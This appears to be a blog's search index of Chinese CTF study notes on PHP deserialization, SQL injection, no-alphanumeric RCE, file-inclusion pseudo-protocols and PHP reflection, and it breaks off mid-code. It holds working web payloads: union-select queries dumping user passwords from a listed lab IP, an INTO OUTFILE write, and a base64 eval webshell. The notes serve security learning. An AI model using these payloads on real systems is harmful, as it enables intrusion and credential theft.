<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>反序列化</title>
      <link href="/2025/05/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/05/18/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>构造恶意的序列化数据来绕过 __wakeup 方法 让设置的属性数量大于实际属性数量</p><p>?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p><p>这个URL  O表示这是一个对象 4表示对象类名长度  Name是对象类名  </p><p>这里是为了绕过Wake_up函数 让属性数量大于实际属性数量</p><p>%00 是 URL 编码（或百分号编码）后的 <strong>空字节（NULL byte, ASCII 0）</strong>。</p><ul><li>在 PHP 中，空字节 <code>&quot;\x00&quot;</code>（或者它的 URL 编码 <code>%00</code>）在对象属性名中有一个特殊的作用：它用作 <strong>类名和属性名之间的分隔符</strong>。</li><li>具体来说，格式是 <code>&quot;\x00ClassName\x00propertyName&quot;</code>。这表示 username是 <code>Name</code> 类的一个 <strong>私有（private）</strong> 属性。</li></ul><p><strong>为什么是 <code>%00</code> 而不是 <code>%20</code></strong>：</p><ul><li><strong><code>%20</code> 是空格</strong>：在对象的序列化字符串中，属性名本身（如 <code>username</code> 或 <code>password</code>）通常不会包含空格。即使包含，<code>%20</code> 也不会起到分隔类名和属性名的作用。</li><li><strong><code>%00</code> 是分隔符</strong>：序列化格式规定使用空字节 <code>&quot;\x00&quot;</code> 来明确标记一个私有属性，其结构为 <code>&quot;\x00类名\x00属性名&quot;</code>。这是 PHP 内部表示私有属性的方式。</li></ul><p>但如果是共有属性 属性前面就不用加类名 </p><h3 id="属性引用"><a href="#属性引用" class="headerlink" title="属性引用"></a>属性引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           $this-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           if($this-&gt;correct === $this-&gt;input) &#123;</span><br><span class="line">               echo file_get_contents(&quot;/flag&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里因为correct时刻都在变 用到了一个引用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public $correct = &quot;&quot;;</span><br><span class="line">   public $input = &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new BUU();</span><br><span class="line">$a-&gt;correct = &quot;&quot;;</span><br><span class="line">$a-&gt;input = &amp;$a-&gt;correct;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果是   O:3:”BUU”:2:{s:7:”correct”;s:0:””;s:5:”input”;R:2;}</p><p>这里的 <code>R:2;</code> 表示 <code>$input</code> 是对序列化数组中第二个元素的引用（计数从 1 开始）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/2025/05/10/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/05/10/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>在有注入点处输入恶意webshell，从而进行与数据库交互，获取信息和删改数据库</p><h2 id="SQL注入条件"><a href="#SQL注入条件" class="headerlink" title="SQL注入条件"></a>SQL注入条件</h2><p> 可传入可控参数，可带入数据库交互，参数不存在过滤或过滤不严</p><h3 id="MySQL的一些特性和使用"><a href="#MySQL的一些特性和使用" class="headerlink" title="MySQL的一些特性和使用"></a>MySQL的一些特性和使用</h3><p>1.在MYSQL5.0以上版本中，mysql存在一个自带数据库名为information_schema，它是一个存储所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或者列名信息。</p><p>2.数据库中符号”.”代表下一级，如xiaodi.user表示xiaodi数据库下的user表名。</p><p>3.information_schema.tables：记录所有表名信息的表<br>information_schema.columns：记录所有列名信息的表<br>table_name：表名<br>column_name：列名<br>table_schema：数据库名</p><p>补充：如何判断注入点？</p><p>老办法：<br>and 1&#x3D;1 页面正常<br>and 1&#x3D;2 页面错误<br>可能存在注入点</p><p>新办法：<br>select * from users where id&#x3D;1daadda LIMIT 0,1<br>xxx&#x2F;?id&#x3D;1daadda 这样输入，如果对网站有影响，和原来网站有差别，证明他代入数据库查询了，证明了会有漏洞；如果没有差别，网站不检测你输入的参数即不能传递参数，说明没有漏洞。<br>如果报了404错误或跳转，说明网站对输入参数检测了，大部分没有漏洞</p><p>然后猜解列名数量(字段数)</p><p>因为union联合查询字段数必须一样，否则会报错；<br>使用order by x(数字) 错误与正常的临界值，不断测试x直到页面错误；<br>输入5是错误的</p><p>?id&#x3D;1 order by 4</p><p>报错猜解准备<br>由上面猜解字段数得到下面<br><a href="http://219.153.49.228:42123/new_list.php?id=-1">http://219.153.49.228:42123/new_list.php?id=-1</a> union select 1,2,3,4</p><p>可以看到哪里有显示位 便于后面把想要的数据替换到有显示位的地方</p><h3 id="开始信息收集"><a href="#开始信息收集" class="headerlink" title="开始信息收集"></a>开始信息收集</h3><p>数据库版本：version() -&gt; 5.7.22-0ubuntu0.16.04.1<br>数据库名字：database() -&gt; mozhe_Discuz_StormGroup<br>数据库用户：user() -&gt; root@localhost<br>操作系统：@@version_compile_os -&gt; Linux</p><p>查询指定数据库名mozhe_Discuz_StormGroup下的表名信息：<br><a href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,group_concat(table_name),3,4 from information_schema.tables<br>where table_schema&#x3D;‘mozhe_Discuz_StormGroup’</p><p>查询指定表名StormGroup_member下的列名信息：<br><a href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;‘StormGroup_member’</p><p>查询指定表名StormGroup_member下的数据：<br><a href="http://219.153.49.228:43123/new_list.php?id=-1">http://219.153.49.228:43123/new_list.php?id=-1</a><br>union select 1,name,password,4 from StormGroup_member</p><p>查另一个数据库的信息 可以直接数据库.表名 dvwa.users  或者分开说数据库&#x3D; ，表名&#x3D;</p><h3 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h3><p><strong>1.跨库查询及应用思路</strong><br>原理：一个网站的注入点影响到另一个网站的数据，需要root型注入点，</p><p>通过’ select * from schemata；’语句，查询数据库中所有数据库的名字；</p><p>实现跨库注入，首先需要获得跨库的数据库的名字；<br>可以通过查询schemata获得另一个数据库名</p><p>通过SQL语句注入，获得所有数据库名字；<br><a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(schema_name),3 from information_schema.schemata</p><p>获取指定dvwa数据库名下的表名信息<br><a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;‘dvwa’</p><p>获取指定dvwa数据库名下的表名users下的列名信息；<br><a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a><br>union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;‘users’</p><p>查另一个数据库的信息 可以直接数据库.表名 dvwa.users  或者分开说数据库&#x3D; ，表名&#x3D;</p><p>?id&#x3D;-1union select 1,user,password from dvwa.users</p><h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h3><p>会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不 同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。</p><p>load_file(): 读取函数<br>into outfile 或者 into dumpfile:导出函数  ‘ union select username, password from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ %23</p><p>路径获取常见方法：<br>报错显示，遗留文件，漏洞报错，平台配置文件，爆破等;</p><p>相关防注入方法<br>1.魔术引导及常见防护</p><p>当magic_quotes_gpc &#x3D; On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线，从而不会被执行</p><p>2.采用内置函数进行防护<br>addslashes()函数也是和魔术引导一样效果<br>is_int()函数判断变量<br>还有更多内置函数也可以进行防护；<br>正常情况遇到的不多；</p><p>3.自定义关键字：select</p><p>$ id&#x3D;str_replace(‘select’,‘fuck’,$id)<br>将select转换成fuck；<br>绕过方法：对过滤关键字进行大小写，hex编码，叠写，等价函数替换等等</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>222</title>
      <link href="/2025/04/27/222/"/>
      <url>/2025/04/27/222/</url>
      
        <content type="html"><![CDATA[<img src="/2025/04/27/222/04/27/222/image-20250427122538956.png" class title="image-20250427122538956">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>111</title>
      <link href="/2025/04/27/111/"/>
      <url>/2025/04/27/111/</url>
      
        <content type="html"><![CDATA[<img src="/2025/04/27/111/04/27/111/image-20250427121827993.png" class title="image-20250427121827993">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>1234</title>
      <link href="/2025/04/27/1234/"/>
      <url>/2025/04/27/1234/</url>
      
        <content type="html"><![CDATA[<img src="/2025/04/27/1234/04/27/1234/image-20250427104000381.png" class title="image-20250427104000381"><img src="/2025/04/27/1234/04/27/1234/image-20250427104746978.png" class title="image-20250427104746978">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<img src="/2025/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-25%20204934.png" class>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>无数字字母rce</title>
      <link href="/2025/04/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/"/>
      <url>/2025/04/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/</url>
      
        <content type="html"><![CDATA[<p>无数字字母rce的理解</p><p>就是不利用数字和字母构造出webshell，从而能够执行我们的命令。</p><p>几种变换</p><h2 id="1-按位异或"><a href="#1-按位异或" class="headerlink" title="1.按位异或^"></a>1.按位异或^</h2><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：1^1&#x3D;0,1^0&#x3D;1,0^1&#x3D;1,0^0&#x3D;0，简单的来说就是<strong>相同为零，不同为一</strong>，那假如说我们想要构造出小写字母a，按照上表，a的二进制为01100001，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是@和!这两个，成功异或出了字母a：</p><h3 id="2-按位取反"><a href="#2-按位取反" class="headerlink" title="*2 按位取反*"></a><em><strong>*2 按位取反*</strong></em></h3><h3 id="原码、反码和补码的概念"><a href="#原码、反码和补码的概念" class="headerlink" title="*原码、反码和补码的概念*"></a><em><strong>*原码、反码和补码的概念*</strong></em></h3><p><strong>·</strong> <em><strong>*原码*</strong></em>：最高位为符号位（0 表示正数，1 表示负数），其余位表示数值的绝对值。例如，对于 8 位二进制数，+5 的原码是 0000 0101，-5 的原码是 1000 0101。</p><p><strong>·</strong> <em><strong>*反码*</strong></em>：正数的反码与原码相同；负数的反码是在原码的基础上，符号位不变，其余位取反。例如，+5 的反码是 0000 0101，-5 的反码是 1111 1010。</p><p><strong>·</strong> <em><strong>*补码*</strong></em>：正数的补码与原码相同；负数的补码是在反码的基础上加 1。例如，+5 的补码是 0000 0101，-5 的补码是 1111 1011。</p><h3 id="按位取反的计算步骤"><a href="#按位取反的计算步骤" class="headerlink" title="*按位取反的计算步骤*"></a><em><strong>*按位取反的计算步骤*</strong></em></h3><p>下面以 8 位二进制数为例，计算 5 按位取反的结果：</p><ol><li>确定 5 的原码、反码和补码：</li></ol><p>· 原码：0000 0101</p><p>· 反码：0000 0101</p><p>· 补码：0000 0101</p><ol start="2"><li>对补码进行按位取反：</li></ol><p>· 按位取反后的结果：1111 1010</p><ol start="3"><li>判断取反结果是正数还是负数：</li></ol><p>· 由于最高位是 1，所以这是一个负数的补码。</p><ol start="4"><li>将负数的补码转换为原码：</li></ol><p>· 先减 1 得到反码：1111 1001</p><p>· 再将反码除符号位外取反得到原码：1000 0110</p><ol start="5"><li>计算原码对应的十进制数：</li></ol><p>· 原码 1000 0110 对应的十进制数是 -6。</p><p>取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含伪协议</title>
      <link href="/2025/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2025/04/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>1.?file&#x3D;data:text&#x2F;plain,<?php phpinfo()?></p><p>2.?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p><p>3.?file&#x3D;php:&#x2F;&#x2F;input [POST DATA:]<?php phpinfo()?></p><p>4.?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p><?php phpinfo()?><p>如果找不到flag，那也别傻站着，换个命令，<?php system("ls")?>或者直接<?php system("cat flag.php")?></p><p>第二点的PD9waHAgcGhwaW5mbygpPz4&#x3D;base64形式的<?php phpinfo()?>，如果这个不行，也别傻站着，换个命令，你不知道对面会过滤什么，唯有多尝试。</p><p>?filename&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA&#x2F;Pg&#x3D;&#x3D;</p><p>这里其实就是上传文件木马<?php eval($_POST[xiaohua]); ?>，之后直接连接蚁剑就可以拿到flag，这个就叫做 (data:&#x2F;&#x2F;伪协议传木马)</p><h3 id="转换过滤器是什么"><a href="#转换过滤器是什么" class="headerlink" title="转换过滤器是什么"></a>转换过滤器是什么</h3><p>转换过滤器是 PHP 里一种特殊的工具，它能对文件内容进行特定的转换操作。想象一下，你手里有一份文件，文件里有各种各样的内容，而转换过滤器就像是一个 “内容加工机器”，可以按照你的要求对文件内容进行修改。</p><p>比如说，文件里的字母可能是小写的，你希望它们都变成大写，或者文件内容是一堆正常文字，你想把它们变成 Base64 编码的形式，又或者你想对文件内容进行加密、解密等操作，转换过滤器就可以帮你实现这些功能。</p><h3 id="在文件包含伪协议中的用法"><a href="#在文件包含伪协议中的用法" class="headerlink" title="在文件包含伪协议中的用法"></a>在文件包含伪协议中的用法</h3><h4 id="1-convert-base64-encode-过滤器"><a href="#1-convert-base64-encode-过滤器" class="headerlink" title="1. convert.base64-encode 过滤器"></a>1. <code>convert.base64-encode</code> 过滤器</h4><p>这个过滤器的作用是把文件内容转换为 Base64 编码的形式。Base64 编码是一种把二进制数据转换为可打印 ASCII 字符的编码方式，常用于在文本协议中传输二进制数据</p><h4 id="2-read-string-toupper-过滤器"><a href="#2-read-string-toupper-过滤器" class="headerlink" title="2. read=string.toupper 过滤器"></a>2. <code>read=string.toupper</code> 过滤器</h4><p>这个过滤器的作用是把文件内容中的字母都转换为大写形式。</p><h4 id="3-string-tolower"><a href="#3-string-tolower" class="headerlink" title="3.string.tolower"></a>3.<strong><code>string.tolower</code></strong></h4><p>将文件内容中的所有字母转换为小写形式。若要把一个文件中的大写字母全部转换为小写，可使用<code>php://filter/read=string.tolower/resource=file.txt</code>，这样会读取<code>file.txt</code>的内容并将其中的字母都变成小写后返回。</p><h4 id="4-convert-iconv-："><a href="#4-convert-iconv-：" class="headerlink" title="4.convert.iconv.\*："></a>4.<strong><code>convert.iconv.\*</code></strong>：</h4><p>这是一组用于字符编码转换的过滤器，<code>*</code> 处可以替换为具体的字符编码，如<code>convert.iconv.utf - 8/cp1252</code>用于将 UTF - 8 编码的内容转换为 CP1252 编码。例如，<code>php://filter/convert.iconv.utf - 8/cp1252/resource=file.txt</code>可将<code>file.txt</code>中 UTF - 8 编码的内容转换为 CP1252 编码。</p><h5 id="filename-php-filter-convert-iconv-UTF-8-UCS-4-resource-flag-php"><a href="#filename-php-filter-convert-iconv-UTF-8-UCS-4-resource-flag-php" class="headerlink" title="?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UTF-8.UCS-4*&#x2F;resource&#x3D;flag.php"></a>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UTF-8.UCS-4*&#x2F;resource&#x3D;flag.php</h5><p>这个payload几乎都能用</p><p>过滤了一些就用爆破</p><p> UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*</p><h4 id="string-rot13"><a href="#string-rot13" class="headerlink" title="string.rot13"></a><strong>string.rot13</strong></h4><p>str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;1.php</p><h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><p>虽然 压缩封装协议 提供了在本地文件系统中创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p><p>例如：</p><p>?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php就是对flag.php进行zlib压缩处理，然后读取文本信息</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>反射</title>
      <link href="/2025/04/23/%E5%8F%8D%E5%B0%84/"/>
      <url>/2025/04/23/%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h3><p>想象一下，你有一个神秘的黑盒子，这个黑盒子里有各种机关和按钮，但你一开始并不知道里面具体是什么样的构造。反射就像是给你了一个特殊的工具，让你在不打开黑盒子的情况下，能探测到里面有多少个机关、按钮，还能知道这些机关和按钮是怎么用的，甚至可以直接去操作它们。</p><p>在编程里，反射就是程序在运行的时候可以自我分析和操作的一种能力。正常情况下，我们写代码是预先知道类、方法、属性这些东西的，但反射允许程序在运行时动态地获取这些信息，还能动态地调用方法、访问属性等。</p><h3 id="什么是反射类"><a href="#什么是反射类" class="headerlink" title="什么是反射类"></a>什么是反射类</h3><p>反射类是实现反射机制的重要工具。还是拿上面的黑盒子举例，反射类就像是那个特殊工具的说明书，它能帮助你更好地去探测和操作黑盒子里的东西。在不同的编程语言里，反射类提供了一系列的方法和属性，让你可以获取类的信息，比如类有哪些属性、方法，这些属性和方法的访问权限是什么，还能创建对象、调用方法、修改属性值等。</p><p>PHP的反射功能主要是由以下几个类去实现的：</p><ul><li><p>ReflectionClass：获取类的相关信息，函数、属性、常量等；</p></li><li><p>ReflectionMethod：类的相关方法的获取以及调用；</p></li><li><p>ReflectionParameter：获取类的函数或者方法参数的相关信息；</p></li><li><p>ReflectionProperty：类的相关属性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取反射类</span></span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;phone&#x27;</span>);</span><br><span class="line"><span class="comment">//获取其默认属性</span></span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getDefaultProperties</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$properties</span>);</span><br><span class="line"><span class="comment">//打印结果</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;color&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;red&quot;</span></span><br><span class="line">  <span class="string">&#x27;model&#x27;</span> =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;vivo&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取它的所有方法</span></span><br><span class="line"><span class="variable">$methods</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getMethods</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$methods</span>);</span><br><span class="line"><span class="comment">//打印结果</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="string">&#x27;color&#x27;</span> =&gt;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> =&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;setColor&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> =&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;phone&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="number">1</span>] =&gt;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReflectionMethod</span>#3 (2) </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> =&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;setModel&quot;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> =&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;phone&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1、ReflectionClass使用示例"><a href="#1、ReflectionClass使用示例" class="headerlink" title="1、ReflectionClass使用示例"></a>1、ReflectionClass使用示例</h5></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//获取反射类</span><br><span class="line">$reflection = new ReflectionClass(&#x27;phone&#x27;);</span><br><span class="line">//获取其默认属性</span><br><span class="line">$properties = $reflection-&gt;getDefaultProperties();</span><br><span class="line">var_dump($properties);</span><br><span class="line">//打印结果</span><br><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;color&#x27; =&gt;</span><br><span class="line">  string(3) &quot;red&quot;</span><br><span class="line">  &#x27;model&#x27; =&gt;</span><br><span class="line">  string(4) &quot;vivo&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//获取它的所有方法</span><br><span class="line">$methods = $reflection-&gt;getMethods();</span><br><span class="line">var_dump($methods);</span><br><span class="line">//打印结果</span><br><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;color&#x27; =&gt;</span><br><span class="line">    public $name =&gt;</span><br><span class="line">    string(8) &quot;setColor&quot;</span><br><span class="line">    public $class =&gt;</span><br><span class="line">    string(5) &quot;phone&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  class ReflectionMethod#3 (2) &#123;</span><br><span class="line">    public $name =&gt;</span><br><span class="line">    string(8) &quot;setModel&quot;</span><br><span class="line">    public $class =&gt;</span><br><span class="line">    string(5) &quot;phone&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2、ReflectionMethod使用示例"><a href="#2、ReflectionMethod使用示例" class="headerlink" title="2、ReflectionMethod使用示例"></a>2、ReflectionMethod使用示例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//获取反射的方法</span><br><span class="line">$method = new ReflectionMethod(&#x27;phone&#x27;,&#x27;setColor&#x27;);</span><br><span class="line">//执行方法</span><br><span class="line">$res = $method-&gt;invokeArgs(new phone(), [&#x27;blue&#x27;]);</span><br><span class="line">var_dump($res);</span><br><span class="line">//打印结果</span><br><span class="line">string(4) &quot;blue&quot;</span><br></pre></td></tr></table></figure><h5 id="3、ReflectionParameter使用示例"><a href="#3、ReflectionParameter使用示例" class="headerlink" title="3、ReflectionParameter使用示例"></a>3、ReflectionParameter使用示例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//获取反射方法</span><br><span class="line">$method = new ReflectionMethod(&#x27;phone&#x27;, &#x27;setColor&#x27;);</span><br><span class="line">//获取该方法的参数</span><br><span class="line">$parameters = $method-&gt;getParameters();</span><br><span class="line">var_dump($parameters);</span><br><span class="line">//打印结果</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  class ReflectionParameter#2 (1) &#123;</span><br><span class="line">    public $name =&gt;</span><br><span class="line">    string(5) &quot;color&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4、ReflectionProperty使用示例"><a href="#4、ReflectionProperty使用示例" class="headerlink" title="4、ReflectionProperty使用示例"></a>4、ReflectionProperty使用示例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//反射类</span><br><span class="line">$reflection = new ReflectionClass(&#x27;phone&#x27;);</span><br><span class="line">//获取属性</span><br><span class="line">$properties = $reflection-&gt;getDefaultProperties();</span><br><span class="line">var_dump($properties);</span><br><span class="line">//打印结果</span><br><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;color&#x27; =&gt;</span><br><span class="line">  